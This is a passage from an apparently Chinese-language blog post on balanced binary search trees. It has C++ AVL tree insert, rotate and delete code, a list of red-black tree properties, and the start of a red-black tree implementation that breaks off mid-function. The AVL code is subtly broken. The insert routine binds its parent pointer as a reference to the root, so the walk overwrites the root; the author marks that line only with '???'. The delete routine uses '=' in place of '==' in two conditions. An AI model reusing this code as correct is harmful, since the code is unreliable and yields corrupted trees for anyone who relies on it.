class="line"></span><br><span class="line">    <span class="comment">// 插入函数</span></span><br><span class="line">    <span class="keyword">bool</span> _Insert(<span class="keyword">const</span> K key, <span class="keyword">const</span> V value, AVLNode&lt;K, V&gt; *&amp; ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        AVLNode&lt;K, V&gt; * pCur = ptr;</span><br><span class="line">        AVLNode&lt;K, V&gt; *&amp; pParent = _pRoot; <span class="comment">// ???????????????????????????????????????????</span></span><br><span class="line">        <span class="built_in">stack</span>&lt;AVLNode&lt;K, V&gt; *&gt; s;</span><br><span class="line">        <span class="keyword">while</span> (pCur != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pCur-&gt;key == key)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            pParent = pCur;</span><br><span class="line">            s.push(pParent);</span><br><span class="line">            <span class="keyword">if</span> (pCur-&gt;key &gt; key)</span><br><span class="line">            &#123;</span><br><span class="line">                pCur = pCur-&gt;_pLeft;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pCur-&gt;key &lt; key)</span><br><span class="line">            &#123;</span><br><span class="line">                pCur = pCur-&gt;_pRight;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 所插位置为NULL 新建结点</span></span><br><span class="line">        pCur = <span class="keyword">new</span> AVLNode&lt;K, V&gt;(key, value);</span><br><span class="line">        <span class="keyword">if</span> (pCur == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;存储空间不足！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否为空树</span></span><br><span class="line">        <span class="keyword">if</span> (pParent == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = pCur;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; pParent-&gt;key)</span><br><span class="line">            pParent-&gt;_pLeft = pCur;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pParent-&gt;_pRight = pCur;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调整平衡</span></span><br><span class="line">        <span class="keyword">while</span> (s.empty() == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pParent = s.top();</span><br><span class="line">            s.pop();</span><br><span class="line">            <span class="keyword">if</span> (pCur == pParent-&gt;_pLeft)</span><br><span class="line">                pParent-&gt;bf--;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pParent-&gt;bf++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pParent-&gt;bf == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (pParent-&gt;bf == <span class="number">1</span> || pParent-&gt;bf == <span class="number">-1</span>)</span><br><span class="line">                pCur = pParent;</span><br><span class="line">            <span class="keyword">if</span> (pParent-&gt;bf == <span class="number">2</span> || pParent-&gt;bf == <span class="number">-2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 进行调整</span></span><br><span class="line">                <span class="keyword">int</span> d;<span class="comment">// 调整平衡因子</span></span><br><span class="line">                d = (pParent-&gt;bf &lt; <span class="number">0</span>) ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (pCur-&gt;bf == d)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (d == <span class="number">-1</span>)</span><br><span class="line">                        RotateR(pParent); <span class="comment">// 右单旋</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        RotateL(pParent); <span class="comment">// 左单旋</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (d == <span class="number">-1</span>)</span><br><span class="line">                        RotateLR(pParent); <span class="comment">// 左右双旋</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        RotateRL(pParent); <span class="comment">// 右左双旋</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s.empty() == <span class="literal">true</span>)</span><br><span class="line">                pCur = pParent;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                AVLNode&lt;K, V&gt; * q;</span><br><span class="line">                q = s.top();</span><br><span class="line">                <span class="keyword">if</span> (q-&gt;key &gt; pParent-&gt;key)</span><br><span class="line">                    q-&gt;_pLeft = pParent;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    q-&gt;_pRight = pParent;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 左单旋</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RotateL</span><span class="params">(AVLNode&lt;K, V&gt; *&amp; ptr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 右子树比左子树高</span></span><br><span class="line">        <span class="comment">// 对以ptr为根的AVL树作左单旋转，旋转后新根在ptr</span></span><br><span class="line">        AVLNode&lt;K, V&gt; * subL = ptr; <span class="comment">// 要左旋的结点</span></span><br><span class="line">        ptr = subL-&gt;_pRight;</span><br><span class="line"></span><br><span class="line">        subL-&gt;_pRight = ptr-&gt;_pLeft;</span><br><span class="line">        ptr-&gt;_pLeft = subL;</span><br><span class="line">        ptr-&gt;bf = subL-&gt;bf = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 右单旋</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RotateR</span><span class="params">(AVLNode&lt;K, V&gt; *&amp; ptr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 左子树比右子树高</span></span><br><span class="line">        AVLNode&lt;K, V&gt; * subR = ptr; <span class="comment">// 要右旋的结点</span></span><br><span class="line">        ptr = ptr-&gt;_pLeft;</span><br><span class="line"></span><br><span class="line">        subR-&gt;_pLeft = ptr-&gt;_pRight;</span><br><span class="line">        ptr-&gt;_pRight = subR;</span><br><span class="line">        ptr-&gt;bf = subR-&gt;bf = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先左再右单旋</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RotateLR</span><span class="params">(AVLNode&lt;K, V&gt; *&amp; ptr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        AVLNode&lt;K, V&gt; * subL = ptr-&gt;_pLeft;</span><br><span class="line">        AVLNode&lt;K, V&gt; * subR = ptr;</span><br><span class="line"></span><br><span class="line">        ptr = subL-&gt;_pRight;</span><br><span class="line">        subL-&gt;_pRight = ptr-&gt;_pLeft;</span><br><span class="line">        ptr-&gt;_pLeft = subL;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;bf &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            subL-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            subL-&gt;bf = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        subR-&gt;_pLeft = ptr-&gt;_pRight;</span><br><span class="line">        ptr-&gt;_pRight = subR;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;bf == <span class="number">-1</span>)</span><br><span class="line">            subR-&gt;bf = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            subR-&gt;bf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ptr-&gt;bf = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先右后左旋转</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RotateRL</span><span class="params">(AVLNode&lt;K, V&gt; *&amp; ptr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        AVLNode&lt;K, V&gt; * subL = ptr;</span><br><span class="line">        AVLNode&lt;K, V&gt; * subR = ptr-&gt;_pRight;</span><br><span class="line">        ptr = ptr-&gt;_pLeft;</span><br><span class="line"></span><br><span class="line">        subR-&gt;_pLeft = ptr-&gt;_pRight;</span><br><span class="line">        ptr-&gt;_pRight = subR;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;bf &gt;= <span class="number">0</span>)</span><br><span class="line">            subR-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            subR-&gt;bf = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        subL-&gt;_pRight = ptr-&gt;_pLeft;</span><br><span class="line">        ptr-&gt;_pLeft = subL;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;bf == <span class="number">1</span>)</span><br><span class="line">            subL-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            subL-&gt;bf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ptr-&gt;bf = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示函数</span></span><br><span class="line">    <span class="keyword">void</span> _showTree(AVLNode&lt;K, V&gt; * ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        _showTree(ptr-&gt;_pLeft);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ptr-&gt;key &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        _showTree(ptr-&gt;_pRight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除结点</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Remove</span><span class="params">(AVLNode&lt;K, V&gt; *&amp; ptr, K key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        AVLNode&lt;K, V&gt; * pCur = ptr;</span><br><span class="line">        AVLNode&lt;K, V&gt; * pParent = ptr;</span><br><span class="line">        AVLNode&lt;K, V&gt; * gParent = <span class="literal">NULL</span>;</span><br><span class="line">        AVLNode&lt;K, V&gt; * q; <span class="comment">// 左右子树均存在时，找左子树的右结点</span></span><br><span class="line">        <span class="built_in">stack</span>&lt;AVLNode&lt;K, V&gt; *&gt; s;</span><br><span class="line">        <span class="keyword">int</span> pd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> gd = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 找到须要被删除的结点，将路径上的结点记录在栈中</span></span><br><span class="line">        <span class="keyword">while</span> (pCur != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (key == pCur-&gt;key)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            pParent = pCur;</span><br><span class="line">            s.push(pParent);</span><br><span class="line">            <span class="keyword">if</span> (key &gt; pCur-&gt;key)</span><br><span class="line">                pCur = pCur-&gt;_pRight;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pCur = pCur-&gt;_pLeft;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pCur == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pCur-&gt;_pLeft != <span class="literal">NULL</span> &amp;&amp; pCur-&gt;_pRight != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pParent = pCur;</span><br><span class="line">            s.push(pParent);</span><br><span class="line">            q = pCur-&gt;_pLeft;</span><br><span class="line">            <span class="keyword">while</span> (q-&gt;_pRight != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                pParent = q;</span><br><span class="line">                s.push(pParent);</span><br><span class="line">                q = q-&gt;_pRight;</span><br><span class="line">            &#125;</span><br><span class="line">            pCur-&gt;key = q-&gt;key;</span><br><span class="line">            pCur = q;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被删除结点pCur只有一个子结点</span></span><br><span class="line">        <span class="keyword">if</span> (pCur-&gt;_pLeft != <span class="literal">NULL</span>)</span><br><span class="line">            q = pCur-&gt;_pLeft;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q = pCur-&gt;_pRight;</span><br><span class="line">        <span class="keyword">if</span> (pParent == <span class="literal">NULL</span>)</span><br><span class="line">            ptr = q;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pParent-&gt;_pLeft = pCur)</span><br><span class="line">                pParent-&gt;_pLeft = q;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pParent-&gt;_pRight = q;</span><br><span class="line">            <span class="comment">// 从新平衡化</span></span><br><span class="line">            <span class="keyword">while</span> (s.empty() == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                pParent = s.top();</span><br><span class="line">                s.pop();</span><br><span class="line">                <span class="keyword">if</span> (pParent-&gt;_pLeft = pCur)</span><br><span class="line">                    pParent-&gt;bf++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pParent-&gt;bf--;</span><br><span class="line">                <span class="keyword">if</span> (s.empty() == <span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    gParent = s.top();</span><br><span class="line">                    gd = (gParent-&gt;_pLeft == pParent) ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> gd = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (pParent-&gt;bf == <span class="number">1</span> || pParent-&gt;bf == <span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (pParent-&gt;_pLeft != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (pParent-&gt;bf &lt; <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        pd = <span class="number">-1</span>;</span><br><span class="line">                        pCur = pParent-&gt;_pLeft;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        pd = <span class="number">1</span>;</span><br><span class="line">                        pCur = pParent-&gt;_pRight;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (pCur-&gt;bf == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (pd == <span class="number">-1</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            RotateR(pParent);</span><br><span class="line">                            pParent-&gt;bf = <span class="number">1</span>;</span><br><span class="line">                            pParent-&gt;_pLeft-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            RotateL(pParent);</span><br><span class="line">                            pParent-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">                            pParent-&gt;_pRight-&gt;bf = <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (q-&gt;bf == pd)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (pd == <span class="number">-1</span>)</span><br><span class="line">                            RotateR(pParent);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            RotateL(pParent);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (pd == <span class="number">-1</span>)</span><br><span class="line">                            RotateLR(pParent);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            RotateRL(pParent);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (gd == <span class="number">-1</span>)</span><br><span class="line">                        gParent-&gt;_pLeft = pParent;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (gd == <span class="number">1</span>)</span><br><span class="line">                        gParent-&gt;_pRight = pParent;</span><br><span class="line">                &#125;</span><br><span class="line">                q = pParent;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s.empty() == <span class="literal">true</span>)</span><br><span class="line">                ptr = pParent;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span> pCur;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; t;</span><br><span class="line">    t.Insert(<span class="number">1</span>, <span class="number">11</span>);</span><br><span class="line">    t.Insert(<span class="number">2</span>, <span class="number">12</span>);</span><br><span class="line">    t.Insert(<span class="number">3</span>, <span class="number">13</span>);</span><br><span class="line">    t.Insert(<span class="number">4</span>, <span class="number">14</span>);</span><br><span class="line">    t.showTree();</span><br><span class="line">    t.Remove(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="RBT"><a href="#RBT" class="headerlink" title="RBT"></a>RBT</h1><h2 id="RBT性质"><a href="#RBT性质" class="headerlink" title="RBT性质"></a>RBT性质</h2><p>1.每个结点要么是红的要么是黑的。</p><p>2.根结点是黑的。</p><p>3.每个叶结点（叶结点即指树尾端NIL指针或NULL结点）都是黑的。</p><p>4.如果一个结点是红的，那么它的两个儿子都是黑的。</p><p>5.对于任意结点而言，其到叶结点树尾端NIL指针的每条路径都包含相同数目的黑结点。</p><p>借王道一个口诀 左根右，根叶黑，不红红，黑路同</p><h2 id="RBT操作"><a href="#RBT操作" class="headerlink" title="RBT操作"></a>RBT操作</h2><p>红黑树的5条性质，使一棵n个结点的红黑树始终保持了logn的高度。同时，在进行增删改之后这些性质并不容易被破坏。同时破坏了性质之后的修改也并不复杂。</p><p>增</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//红黑树</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> <span class="title">ColorType</span> &#123;</span>RED, BLACK&#125; ColorType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rbt_t</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">rbt_t</span> * left;</span><br><span class="line">    <span class="keyword">rbt_t</span> * right;</span><br><span class="line">    <span class="keyword">rbt_t</span> * p;</span><br><span class="line">    ColorType color;</span><br><span class="line">&#125;<span class="keyword">rbt_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rbt_root_t</span>&#123;</span></span><br><span class="line">    <span class="keyword">rbt_t</span>* root;</span><br><span class="line">    <span class="keyword">rbt_t</span>* nil;</span><br><span class="line">&#125;<span class="keyword">rbt_root_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">rbt_root_t</span>* <span class="title">rbt_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rbt_handleReorient</span><span class="params">(<span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* x, <span class="keyword">int</span> k)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">rbt_root_t</span>* <span class="title">rbt_insert</span><span class="params">(<span class="keyword">rbt_root_t</span>* &amp;T, <span class="keyword">int</span> k)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">rbt_root_t</span>* <span class="title">rbt_delete</span><span class="params">(<span class="keyword">rbt_root_t</span>* &amp;T, <span class="keyword">int</span> k)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_transplant</span><span class="params">(<span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* u, <span class="keyword">rbt_t</span>* v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rbt_left_rotate</span><span class="params">( <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rbt_right_rotate</span><span class="params">( <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_inPrint</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_prePrint</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rbt_t</span> * T, <span class="keyword">rbt_t</span>* t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rbt_root_t</span>* T)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">rbt_t</span>* <span class="title">rbt_findMin</span><span class="params">(<span class="keyword">rbt_root_t</span> * T, <span class="keyword">rbt_t</span>* t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">rbt_t</span>* <span class="title">rbt_findMax</span><span class="params">(<span class="keyword">rbt_root_t</span> * T, <span class="keyword">rbt_t</span>* t)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">rbt_t</span>* <span class="title">rbt_findMin</span><span class="params">(<span class="keyword">rbt_root_t</span> * T, <span class="keyword">rbt_t</span>* t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t == T-&gt;nil) <span class="keyword">return</span> T-&gt;nil;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(t-&gt;left != T-&gt;nil)</span><br><span class="line">        t = t-&gt;left;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">rbt_t</span>* <span class="title">rbt_findMax</span><span class="params">(<span class="keyword">rbt_root_t</span> * T, <span class="keyword">rbt_t</span>* t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t == T-&gt;nil) <span class="keyword">return</span> T-&gt;nil;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(t-&gt;right != T-&gt;nil)</span><br><span class="line">        t = t-&gt;right;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*@brief rbt_init 初始化</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">rbt_root_t</span>* <span class="title">rbt_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">rbt_root_t</span>* T;</span><br><span class="line"></span><br><span class="line">    T = (<span class="keyword">rbt_root_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">rbt_root_t</span>));</span><br><span class="line">    assert( <span class="literal">NULL</span> != T);</span><br><span class="line"></span><br><span class="line">    T-&gt;nil = (<span class="keyword">rbt_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">rbt_t</span>));</span><br><span class="line">    assert(<span class="literal">NULL</span> != T-&gt;nil);</span><br><span class="line">    T-&gt;nil-&gt;color = BLACK;</span><br><span class="line">    T-&gt;nil-&gt;left = T-&gt;nil-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    T-&gt;nil-&gt;p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    T-&gt;root = T-&gt;nil;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*@brief rbt_handleReorient  内部函数 由rbt_insert调用</span></span><br><span class="line"><span class="comment">*      在两种情况下调用这个函数：</span></span><br><span class="line"><span class="comment">* 1 x有连个红色儿子</span></span><br><span class="line"><span class="comment">* 2 x为新插入的结点</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_handleReorient</span><span class="params">(<span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* x, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在第一种情况下，进行颜色翻转； 在第二种情况下，相当于对新插入的x点初始化</span></span><br><span class="line">    x-&gt;color = RED;</span><br><span class="line">    x-&gt;left-&gt;color = x-&gt;right-&gt;color = BLACK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果x.p为红色，那么x.p一定不是根，x.p.p一定不是T.nil，而且为黑色</span></span><br><span class="line">    <span class="keyword">if</span>(  RED == x-&gt;p-&gt;color)&#123;</span><br><span class="line">        x-&gt;p-&gt;p-&gt;color = RED;<span class="comment">//此时x, p, x.p.p都为红</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(x-&gt;p-&gt;key &lt; x-&gt;p-&gt;p-&gt;key)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k &gt; x-&gt;p-&gt;key)&#123;</span><br><span class="line">                x-&gt;color = BLACK;<span class="comment">//小心地处理颜色</span></span><br><span class="line">                rbt_left_rotate(T,x-&gt;p);</span><br><span class="line">                rbt_right_rotate(T,x-&gt;p);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                x-&gt;p-&gt;color = BLACK;<span class="comment">//小心地处理颜色</span></span><br><span class="line">                rbt_right_rotate(T,x-&gt;p-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(k &lt; x-&gt;p-&gt;key)&#123;</span><br><span class="line">                x-&gt;color = BLACK;</span><br><span class="line">                rbt_right_rotate(T,x-&gt;p);</span><br><span class="line">                rbt_left_rotate(T,x-&gt;p);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                x-&gt;p-&gt;color = BLACK;</span><br><span class="line">                rbt_left_rotate(T,x-&gt;p-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    T-&gt;root-&gt;color = BLACK;<span class="comment">//无条件令根为黑色</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*@brief brt_insert 插入</span></span><br><span class="line"><span class="comment">*1 新插入的结点一定是红色的，如果是黑色的，会破坏条件4（每个结点到null叶结点的每条路径有同样数目的黑色结点）</span></span><br><span class="line"><span class="comment">*2 如果新插入的结点的父亲是黑色的，那么插入完成。 如果父亲是红色的，那么做一个旋转即可。（前提是叔叔是黑色的）</span></span><br><span class="line"><span class="comment">*3 我们这个插入要保证其叔叔是黑色的。也就是在x下沉过程中，不允许存在两个红色结点肩并肩。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">rbt_root_t</span>* <span class="title">rbt_insert</span><span class="params">(<span class="keyword">rbt_root_t</span>* &amp;T, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">rbt_t</span> * x, *p;</span><br><span class="line">    x = T-&gt;root;</span><br><span class="line">    p = x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//令x下沉到叶子上，而且保证一路上不会有同时为红色的兄弟</span></span><br><span class="line">    <span class="keyword">while</span>( x != T-&gt;nil)&#123;  </span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//保证没有一对兄弟同时为红色， 为什么要这么做？</span></span><br><span 